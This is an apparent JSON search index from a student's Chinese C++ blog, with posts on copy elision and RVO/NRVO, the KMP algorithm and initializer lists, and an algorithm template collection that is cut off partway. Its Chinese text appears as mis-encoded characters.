[{"content":"æ¦‚å¿µè§£é‡Š ä»€ä¹ˆæ˜¯copy elisionï¼Ÿä»€ä¹ˆæ˜¯RVOï¼Ÿä»€ä¹ˆæ˜¯NRVOï¼Ÿ\ncopy elisionæ˜¯C++ä¸­å¯¹äºå‡½æ•°è¿”å›å€¼çš„ä¼˜åŒ–æœºåˆ¶ï¼Œå¯ä»¥å‡å°‘å¤šä½™çš„æ„é€ /ææ„æ“ä½œï¼Œæå‡æ•ˆç‡ RVOï¼ˆreturn value optimizationï¼‰ï¼Œè¿”å›å€¼ä¼˜åŒ–ï¼Œæ˜¯copy elisionçš„ä¸€ç§å½¢å¼ NRVOï¼ˆnamed return value optimizationï¼‰ï¼Œå…·åè¿”å›å€¼ä¼˜åŒ–ï¼Œæ˜¯copy elisionçš„ä¸€ç§å½¢å¼ ä¸€ä¸ªä¾‹å­ç†è§£copy elision 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Obj { public: Obj() { cout \u0026lt;\u0026lt; \u0026#34;Constructed\\n\u0026#34;; } ~Obj() { cout \u0026lt;\u0026lt; \u0026#34;Deconstructed\\n\u0026#34;; } Obj(const Obj\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Copy constructed\\n\u0026#34;; } Obj(Obj\u0026amp;\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Move constructed\\n\u0026#34;; } Obj\u0026amp; operator=(const Obj\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Copy assignment\\n\u0026#34;; return *this; } Obj\u0026amp; operator=(Obj\u0026amp;\u0026amp; r) { cout \u0026lt;\u0026lt; \u0026#34;Move assignment\\n\u0026#34;; return *this; } }; Obj f1() { return Obj(); // RVO } Obj f2() { Obj t; return t; // NRVO } Obj f3() { Obj t; return std::move(t); } int main() { { Obj tmp = f1(); } cout \u0026lt;\u0026lt; \u0026#34;---------------\\n\u0026#34;; { Obj tmp = f2(); } cout \u0026lt;\u0026lt; \u0026#34;---------------\\n\u0026#34;; { Obj tmp = f3(); } return 0; } Qï¼šå‡½æ•°çš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ\næƒ…å†µ1: C++11ï¼Œå…³é—­copy elision 1 clang++ rvo.cc -std=c++11 -fno-elide-constructors -o rvo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Move constructed Deconstructed Deconstructed è§£é‡Šï¼š\næ²¡æœ‰ä»»ä½•ä¼˜åŒ–ï¼Œå¯ä»¥å‘ç°ï¼Œå‡ºç°äº†ä¸€æ¬¡é»˜è®¤æ„é€ ï¼Œä¸¤æ¬¡ç§»åŠ¨æ„é€ ï¼Œä¸¤æ¬¡ææ„ï¼ˆæœ€åä¸€æ¬¡æ˜¯tmpçš„ææ„ï¼Œä¸ç”¨åœ¨æ„ï¼Œä¸‹åŒï¼‰\nä¸¤æ¬¡ç§»åŠ¨æ„é€ åˆ†åˆ«æ˜¯ä¸´æ—¶å¯¹è±¡ç§»åŠ¨åˆ°è¿”å›å€¼ï¼Œä»¥åŠè¿”å›å€¼ç§»åŠ¨åˆ°tmp\næƒ…å†µ2: C++17ï¼Œå…³é—­copy elision 1 clang++ rvo.cc -std=c++17 -fno-elide-constructors -o rvo 1 2 3 4 5 6 7 8 9 10 11 12 Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed è§£é‡Šï¼š\nf1åªå‡ºç°äº†ä¸€æ¬¡æ„é€ ï¼Œf2å’Œf3å¤šäº†ä¸€æ¬¡ç§»åŠ¨æ„é€ å’Œææ„\nC++17é»˜è®¤å®ç°äº†RVOï¼Œè€Œæ²¡æœ‰å¼ºåˆ¶è¦æ±‚ç¼–è¯‘å™¨å®ç°NRVOï¼Œå› æ­¤å°½ç®¡å…³é—­äº†copy elisionï¼Œåœ¨RVOæƒ…å†µä¸‹ï¼Œä»ç„¶è¿›è¡Œäº†ä¼˜åŒ–\nè¿˜å¯ä»¥å‘ç°C++17åœ¨å…³é—­copy elisionæ—¶ä»ç„¶æ¯”å…³é—­äº†copy elisionçš„C++11ä¼˜åŒ–äº†ä¸€æ¬¡ç§»åŠ¨æ„é€ å’Œææ„ï¼Œä¼˜åŒ–äº†è¿”å›å€¼ç§»åŠ¨åˆ°tmpçš„é‚£ä¸€æ¬¡\næƒ…å†µ3: C++11ï¼Œå¼€å¯copy elision 1 clang++ rvo.cc -std=c++11 -o rvo 1 2 3 4 5 6 7 8 9 10 Constructed Deconstructed --------------- Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed æƒ…å†µ4: C++17ï¼Œå¼€å¯copy elision 1 clang++ rvo.cc -std=c++17 -o rvo 1 2 3 4 5 6 7 8 9 10 Constructed Deconstructed --------------- Constructed Deconstructed --------------- Constructed Move constructed Deconstructed Deconstructed è§£é‡Šï¼š\nå½“ä¸å…³é—­copy elisionæ—¶ï¼ŒC++11å’ŒC++17çš„è¡¨ç°æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥å‘ç°å½“ä½¿ç”¨äº†moveæ—¶ï¼Œåè€Œäº§ç”Ÿäº†è´Ÿä¼˜åŒ–ï¼Œå¤šäº†ä¸´æ—¶å¯¹è±¡ç§»åŠ¨åˆ°è¿”å›å€¼é‚£ä¸€æ¬¡\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-09-25T01:00:00Z","image":"https://unicocn.github.io/p/understand-copy-elision/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/understand-copy-elision/","title":"ç†è§£ Copy Elision"},{"content":"èƒŒæ™¯ å­—ç¬¦ä¸²åŒ¹é…é—®é¢˜æ˜¯æŒ‡å¯¹äºå­—ç¬¦ä¸²så’Œå­—ç¬¦ä¸²pï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²påœ¨å­—ç¬¦ä¸²sä¸­å‡ºç°çš„ä½ç½®ã€‚\nå¯¹äºæœ´ç´ çš„ç®—æ³•ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(mn)ï¼Œä¸€ç§ä¼˜åŒ–æ–¹å¼æ˜¯å­—ç¬¦ä¸²å“ˆå¸Œï¼Œé€šè¿‡O(n)çš„é¢„å¤„ç†ï¼Œå¯ä»¥O(1)çš„å¤æ‚åº¦åˆ¤æ–­å­—ç¬¦ä¸²sä¸­é•¿åº¦ä¸ºp.size()çš„å­ä¸²æ˜¯å¦å’Œpç›¸ç­‰ï¼Œ ä½†æ˜¯å“ˆå¸Œçš„é—®é¢˜åœ¨äºå“ˆå¸Œç¢°æ’å¸¦æ¥çš„ä¸ç¡®å®šæ€§ã€‚\nKMP(Knuth-Morris-Pratt)ç®—æ³•å¯ä»¥å®ç°åœ¨O(n+m)çš„æ—¶é—´å¤æ‚åº¦ä¸‹æ‰¾å‡ºå­—ç¬¦ä¸²påœ¨å­—ç¬¦ä¸²sä¸­å‡ºç°çš„æ‰€æœ‰ä½ç½®ã€‚\nåŸç† ä»£ç å®ç° ä¸‹æ ‡ä»0å¼€å§‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void KMP(std::string\u0026amp; s, std::string\u0026amp; p) { int n = s.size(), m = p.size(); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != p[i-1]) j = nxt[j]; if (p[j] == p[i-1]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != s[i-1])) j = nxt[j]; if (p[j] == s[i-1]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } ä¸‹æ ‡ä»1å¼€å§‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;cstring\u0026gt; char s[1000002]; char p[1000002]; // ä¸‹æ ‡ä»1å¼€å§‹+æœ«å°¾ç»ˆç»“ç¬¦ void KMP(char* s, char* p) { int n = strlen(s+1); int m = strlen(p+1); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != p[i]) j = nxt[j]; if (p[j+1] == p[i]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != s[i])) j = nxt[j]; if (p[j+1] == s[i]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } int main() { std::ios::sync_with_stdio(false); std::cin.tie(nullptr); scanf(\u0026#34;%s\u0026#34;, s+1); scanf(\u0026#34;%s\u0026#34;, p+1); KMP(s, p); } Reference: https://www.bilibili.com/video/BV1CY4y14751\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-09-09T01:00:00Z","image":"https://unicocn.github.io/p/understand-kmp/cover_hu5d3189b976991bbaa97ead5a2f977361_753368_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/understand-kmp/","title":"ç†è§£ KMP ç®—æ³•"},{"content":"ç†è§£åˆå§‹åŒ–åˆ—è¡¨ é—®é¢˜å¼•å…¥ é˜…è¯»ä¸‹é¢ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; tmp{{10, 10}, {20, 20}, {30, 20}}; tmp.push_back({1, 2, 3}); // works auto list = {1, 2, 3, 4, 5}; tmp.emplace_back(list); // works // tmp.emplace_back({1, 2, 3, 4, 5}); // error vector\u0026lt;int\u0026gt; v = {1, 2, 3}; v = {1, 2, 3}; vector\u0026lt;int\u0026gt;a{1, 2, 3}; return 0; } Insights:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { std::vector\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt; \u0026gt; tmp = std::vector\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt; \u0026gt;{std::initializer_list\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt;{std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{10, 10}, std::allocator\u0026lt;int\u0026gt;()}, std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{20, 20}, std::allocator\u0026lt;int\u0026gt;()}, std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{30, 20}, std::allocator\u0026lt;int\u0026gt;()}}, std::allocator\u0026lt;std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; \u0026gt;()}; tmp.push_back(std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}); std::initializer_list\u0026lt;int\u0026gt; list = std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3, 4, 5}; tmp.emplace_back\u0026lt;std::initializer_list\u0026lt;int\u0026gt; \u0026amp;\u0026gt;(list); std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; v = std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}; v.operator=(std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}); std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt; a = std::vector\u0026lt;int, std::allocator\u0026lt;int\u0026gt; \u0026gt;{std::initializer_list\u0026lt;int\u0026gt;{1, 2, 3}, std::allocator\u0026lt;int\u0026gt;()}; return 0; } ä¸ºä»€ä¹ˆtmp.emplace_back({1, 2, 3, 4, 5})ä¼šErrorï¼Ÿ\nç†è§£åˆå§‹åŒ–åˆ—è¡¨ é¦–å…ˆå¯¹äºä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œä¸ç†è§£çš„ç‚¹åœ¨äºï¼š\n{1, 2, 3} æ˜¯ä¸€ä¸ª initializer_list vectoræœ‰å‚æ•°ä¸ºinitializer_listçš„æ„é€ å‚æ•° åŒæ—¶ vector v({1, 2, 3}) æ˜¯å¯ä»¥çš„ é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨emplace_backå°†{1, 2, 3}ä½œä¸º args å®Œç¾è½¬å‘ç»™vectorçš„æ„é€ å‡½æ•°ä¸ºä»€ä¹ˆä¼šæŠ¥é”™ï¼Ÿ è§£é‡Šè§ https://en.cppreference.com/w/cpp/language/list_initialization#Notes\nç®€å•æ¥è¯´ï¼Œ{1, 2, 3}ä¸æ˜¯ä¸€ä¸ªexpressionï¼Œå› æ­¤ä¹Ÿæ²¡æœ‰ç±»å‹ï¼Œdecltype({1, 2}) is ill-formed å› æ­¤Argsç±»å‹æ¨æ–­ä¼šæ— æ•ˆï¼Œå› æ­¤v.emplace_back({1, 2, 3})ä¸ä¼šç”Ÿæ•ˆ ä¸ºä»€ä¹ˆ auto x = {1, 2, 3}ï¼Œxçš„ç±»å‹ä¼šè¢«æ¨æ–­ä¸ºinitializer_list? ç­”æ¡ˆ: è§„å®šçš„ç‰¹ä¾‹ ä¸ºä»€ä¹ˆv.push_back({1, 2, 3}) å¯ä»¥ï¼Ÿ\nè§£é‡Šè§ https://en.cppreference.com/w/cpp/language/overload_resolution#Implicit_conversion_sequence_in_list-initialization\nç®€å•æ¥è¯´ï¼Œæ˜¯ä¸€ç§é‡è½½çš„éšå¼è½¬æ¢,å¯ä»¥å°†å…¶è½¬æ¢ä¸ºinitializer_list\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-07-15T10:00:00Z","image":"https://unicocn.github.io/p/cpp-understand-initializer-list/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-understand-initializer-list/","title":"ç†è§£åˆå§‹åŒ–åˆ—è¡¨"},{"content":"å¿«é€Ÿæ’åº(Quick Sort) My Version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void Qsort(vector\u0026lt;int\u0026gt;\u0026amp; a, int l, int r) { int i = l, j = r; int mid = a[(i+j)\u0026gt;\u0026gt;1]; do { while (a[i] \u0026lt; mid) ++i; while (a[j] \u0026gt; mid) --j; if (i \u0026lt;= j) { swap(a[i], a[j]); ++i; --j; } } while (i \u0026lt; j); if (l \u0026lt; j) Qsort(a,l,j); if (i \u0026lt; r) Qsort(a,i,r); } ChatGPT version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int partition(vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { int pivot = arr[high]; int i = low - 1; for (int j = low; j \u0026lt;= high - 1; j++) { if (arr[j] \u0026lt;= pivot) { i++; swap(arr[i], arr[j]); } } swap(arr[i+1], arr[high]); return i+1; } void quickSort(vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { if (low \u0026lt; high) { int pi = partition(arr, low, high); quickSort(arr, low, pi - 1); quickSort(arr, pi + 1, high); } } å½’å¹¶æ’åº(Merge Sort) é€’å½’ç‰ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void MergeSort(vector\u0026lt;int\u0026gt;\u0026amp; a, int l, int r) { if (l == r) return; int mid = l + ((r - l) \u0026gt;\u0026gt; 1); MergeSort(a,l,mid); MergeSort(a,mid+1,r); int tmp[a.size()]; // ç”¨vectorå¤ªæ…¢ int i = l, j = mid+1, k = l; while (i \u0026lt;= mid \u0026amp;\u0026amp; j \u0026lt;= r) tmp[k++] = (a[i] \u0026lt; a[j])?a[i++]:a[j++]; while (i \u0026lt;= mid) tmp[k++] = a[i++]; while (j \u0026lt;= r) tmp[k++] = a[j++]; for (int i = l; i \u0026lt;= r; ++i) a[i] = tmp[i]; return; } è¿­ä»£ç‰ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 void merge(vector\u0026lt;int\u0026gt;\u0026amp; arr, int l, int mid, int r) { int* temp = new int[r - l + 1]; int i = l, j = mid + 1, k = 0; while (i \u0026lt;= mid \u0026amp;\u0026amp; j \u0026lt;= r) { if (arr[i] \u0026lt; arr[j]) { temp[k++] = arr[i++]; } else { temp[k++] = arr[j++]; } } while (i \u0026lt;= mid) { temp[k++] = arr[i++]; } while (j \u0026lt;= r) { temp[k++] = arr[j++]; } for (int i = l, k = 0; i \u0026lt;= r; i++, k++) { arr[i] = temp[k]; } delete[] temp; } void MergeSort(vector\u0026lt;int\u0026gt;\u0026amp; arr, int n) { for (int step = 1; step \u0026lt; n; step \u0026lt;\u0026lt;= 1) { for (int i = 0; i \u0026lt; n - step; i += (step \u0026lt;\u0026lt; 1)) { int l = i, mid = i + step - 1, r = min(i + (step \u0026lt;\u0026lt; 1) - 1, n - 1); merge(arr, l, mid, r); } } } å¤šè·¯å½’å¹¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class Solution { public: ListNode* merge(ListNode* head1, ListNode* head2) { ListNode* dummy_head = new ListNode(); ListNode* pre = dummy_head; ListNode* p1 = head1; ListNode* p2 = head2; while (p1 != nullptr \u0026amp;\u0026amp; p2 != nullptr) { if (p1-\u0026gt;val \u0026lt; p2-\u0026gt;val) { pre-\u0026gt;next = p1; pre = pre-\u0026gt;next; p1 = p1-\u0026gt;next; } else { pre-\u0026gt;next = p2; pre = pre-\u0026gt;next; p2 = p2-\u0026gt;next; } } if (p1 != nullptr) pre-\u0026gt;next = p1; if (p2 != nullptr) pre-\u0026gt;next = p2; return dummy_head-\u0026gt;next; } ListNode* mergeKLists(vector\u0026lt;ListNode*\u0026gt;\u0026amp; lists, int l, int r) { if (l \u0026gt; r) return nullptr; if (l == r) return lists[l]; return merge(mergeKLists(lists, l, (l + r) \u0026gt;\u0026gt; 1), mergeKLists(lists, ((l + r) \u0026gt;\u0026gt; 1) + 1, r)); } ListNode* mergeKLists(vector\u0026lt;ListNode*\u0026gt;\u0026amp; lists) { return mergeKLists(lists, 0, lists.size() - 1); } }; å¹¶æŸ¥é›†(Union-Find Set) è·¯å¾„å‹ç¼© 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int main() { int n; cin \u0026gt;\u0026gt; n; vector\u0026lt;int\u0026gt; f(n); for (int i = 0; i \u0026lt; n; ++i) f[i] = i; function\u0026lt;int(int)\u0026gt; Find = [\u0026amp;](int x) { return (f[x] == x)?x:f[x] = Find(f[x]); }; function\u0026lt;void(int,int)\u0026gt; Union = [\u0026amp;](int x, int y) { f[Find(x)] = y; }; for (int i = 0; i \u0026lt; n; ++i) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; Union(a,b); } return 0; } è·¯å¾„å‹ç¼©+æŒ‰ç§©åˆå¹¶(To do) æ‹“æ‰‘æ’åº(Topological Sort) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void topo(int n, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; prerequisites) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; adj(n); vector\u0026lt;int\u0026gt; ind(n, 0); for (auto \u0026amp;p : prerequisites) { int x = p[0], y = p[1]; adj[y].push_back(x); ind[x] ++; } queue\u0026lt;int\u0026gt; Q; vector\u0026lt;bool\u0026gt; vis(n, false); for (int p = 0; p \u0026lt; n; ++p) if (ind[p] == 0) { Q.push(p); vis[p] = true; } while (!Q.empty()) { auto cur = Q.front(); Q.pop(); for (auto \u0026amp;nxt : adj[cur]) if (!vis[nxt]) { if (--ind[nxt] == 0) { Q.push(nxt); vis[nxt] = true; } } } } æ¬§æ‹‰ç­›æ³•æ±‚ç´ æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 vector\u0026lt;int\u0026gt; getPrimes(int n) { vector\u0026lt;int\u0026gt; primes; vector\u0026lt;bool\u0026gt; isPrime(n + 1, true); for (int i = 2; i \u0026lt;= n; ++i) { if (isPrime[i]) { primes.push_back(i); } for (int j = 0; j \u0026lt; primes.size() \u0026amp;\u0026amp; i * primes[j] \u0026lt;= n; ++j) { isPrime[i * primes[j]] = false; if (i % primes[j] == 0) break; } } return primes; } æ¨¡æ•°é€†å…ƒ è´¹é©¬å°å®šç†æ±‚é€†å…ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* a^bæ¨¡modçš„å¿«é€Ÿå¹‚ */ int64_t modpow(int64_t a, int64_t b, int64_t mod) { int64_t res = 1; while (b) { if (b \u0026amp; 1) res = res * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return res; } /* æ±‚aæ¨¡modä¸‹çš„é€†å…ƒ */ int64_t modinv(int64_t a, int64_t mod) { return modpow(a, mod - 2, mod); } çº¿æ€§é€†å…ƒæ±‚æ³• é˜¶ä¹˜é€†å…ƒ(æ±‚0-né˜¶ä¹˜æ¨¡pçš„é€†å…ƒ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void exPower( int b, int p, int \u0026amp; a, int \u0026amp; k ) { // æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚é€†å…ƒ if( p == 0 ) { a = 1; k = 0; return; } exPower( p, b % p, k, a ); k -= b / p * a; return; } int inv( int b, int p ) { int a, k; exPower( b, p, a, k ); if( a \u0026lt; 0 ) a += p; return a; } void init( int n ) { Fact[ 0 ] = 1; for( int i = 1; i \u0026lt;= n; ++i ) Fact[ i ] = Fact[ i - 1 ] * i % Mod; INV[ n ] = inv( Fact[ n ], Mod ); // å…ˆæ±‚å‡ºn!çš„é€†å…ƒï¼Œä¹Ÿå¯ä»¥ç”¨è´¹é©¬å°å®šç†æ±‚ for( int i = n - 1; i \u0026gt;= 0; --i ) INV[ i ] = INV[ i + 1 ] * ( i + 1 ) % Mod; return; } è¿ç»­æ•°å­—é€†å…ƒ(æ±‚1-næ¨¡pçš„é€†å…ƒ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int n; int p; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; p; vector\u0026lt;int\u0026gt; ans(n + 1); ans[1] = 1; for (int i = 2; i \u0026lt;= n; ++i) ans[i] = static_cast\u0026lt;int\u0026gt;(1LL * (p - p / i) * ans[p % i] % p); for (int i = 1; i \u0026lt;= n; ++i) cout \u0026lt;\u0026lt; ans[i] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } çŸ©é˜µå¿«é€Ÿå¹‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; using ll = long long; constexpr ll MOD = 1e9 + 7; int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int n; ll k; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; a(n, vector\u0026lt;int\u0026gt;(n)); vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res(n, vector\u0026lt;int\u0026gt;(n, 0)); for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) cin \u0026gt;\u0026gt; a[i][j]; for (int i = 0; i \u0026lt; n; ++i) res[i][i] = 1; auto getMul = [\u0026amp;](vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; \u0026amp;a, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; \u0026amp;b) { int tmp[n][n]; memset(tmp, 0, sizeof(tmp)); for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) for (int k = 0; k \u0026lt; n; ++k) tmp[i][j] = (int)(1LL * tmp[i][j] + 1LL * a[i][k] * b[k][j] % MOD) % MOD; for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) a[i][j] = tmp[i][j]; }; while (k) { if (k \u0026amp; 1) getMul(res, a); getMul(a, a); k \u0026gt;\u0026gt;= 1; } for (int i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; n; ++j) cout \u0026lt;\u0026lt; res[i][j] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[j == n-1]; return 0; } KMP ä¸‹æ ‡ä»0å¼€å§‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void KMP(std::string\u0026amp; s, std::string\u0026amp; p) { int n = s.size(), m = p.size(); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != p[i-1]) j = nxt[j]; if (p[j] == p[i-1]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j] != s[i-1])) j = nxt[j]; if (p[j] == s[i-1]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } ä¸‹æ ‡ä»1å¼€å§‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;cstring\u0026gt; char s[1000002]; char p[1000002]; // ä¸‹æ ‡ä»1å¼€å§‹+æœ«å°¾ç»ˆç»“ç¬¦ void KMP(char* s, char* p) { int n = strlen(s+1); int m = strlen(p+1); std::vector\u0026lt;int\u0026gt; nxt(m+1); std::vector\u0026lt;int\u0026gt; f(n+1); nxt[1] = 0; int j = 0; for (int i = 2; i \u0026lt;= m; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != p[i]) j = nxt[j]; if (p[j+1] == p[i]) j++; nxt[i] = j; } j = 0; for (int i = 1; i \u0026lt;= n; ++i) { while ((j == m) || (j \u0026gt; 0 \u0026amp;\u0026amp; p[j+1] != s[i])) j = nxt[j]; if (p[j+1] == s[i]) j ++; f[i] = j; if (f[i] == m) std::cout \u0026lt;\u0026lt; i - m + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } for (int i = 1; i \u0026lt;= m; ++i) std::cout \u0026lt;\u0026lt; nxt[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i == m]; } int main() { std::ios::sync_with_stdio(false); std::cin.tie(nullptr); scanf(\u0026#34;%s\u0026#34;, s+1); scanf(\u0026#34;%s\u0026#34;, p+1); KMP(s, p); } æ ‘çŠ¶æ•°ç»„(Fenwick Tree) Reference: https://www.cnblogs.com/xenny/p/9739600.html\nå•ç‚¹ä¿®æ”¹ \u0026amp; åŒºé—´æ±‚å’Œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 